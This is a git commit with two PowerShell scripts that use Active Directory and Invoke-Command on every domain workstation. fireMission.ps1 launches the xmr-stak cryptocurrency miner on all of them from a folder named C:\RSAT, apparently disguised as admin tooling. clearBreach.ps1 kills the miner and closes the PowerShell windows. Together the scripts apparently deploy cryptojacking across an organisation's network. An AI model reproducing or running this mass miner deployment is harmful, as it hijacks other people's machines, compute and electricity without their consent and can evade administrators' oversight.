a3be1907ad1c263106e35abf49c2f5df1273165d
velvet-valdes <valdestr@gmail.com>
2018-04-06 19:13:07 -0400

    Feature Add
    Added fireBase, fireMission, clearBreach, reinitGunline

---
+++ clearBreach.ps1
@@ -0,0 +1,16 @@
+﻿# Get the workstations in the active computers OU and filter out the weirdos. Store them in a host list.
+$HostList=(Get-ADComputer -Filter "Name -like 'wkst*'" -SearchBase "OU=Active Computers, DC=camthebull, DC=net").name
+
+foreach($client in $HostList )
+{
+    
+    write-host "Sending command to $client"
+    Invoke-Command -ComputerName $client -Scriptblock {Write-Host 'Terminating:' $client; Stop-Process -Name xmr-stak}
+
+}
+
+# Lets close out all of our powershellz!
+Get-Process -Name powershell | Where-Object -FilterScript {$_.Id -ne $PID} | Stop-Process -PassThru
+
+# Quick hack for user input to keep window open
+Read-Host -Prompt "Press Enter to exit"
---
+++ fireMission.ps1
@@ -0,0 +1,16 @@
+﻿# Get the workstations in the active computers OU and filter out the weirdos. Store them in a host list.
+$HostList=(Get-ADComputer -Filter "Name -like 'wkst*'" -SearchBase "OU=Active Computers, DC=camthebull, DC=net").name
+
+# Operate on the objects stored in the host list variable
+#Uncomment below to echo the scriptblock into console. 
+$scriptblock
+
+foreach($client in $HostList )
+{
+    
+    write-host "Sending command to.. $client"
+    $cmdstring = "invoke-command -computername $client -scriptblock {write-host 'I am' $client; & ‘C:\RSAT\xmr-stak-win64\xmr-stak.exe’ -c 'C:\RSAT\xmr-stak-win64\config.txt' -C 'C:\RSAT\xmr-stak-win64\pools.txt'}"
+    $scriptblock = [scriptblock]::Create($cmdstring)
+
+    start-process powershell -argumentlist "-noexit -command $Scriptblock"
+}
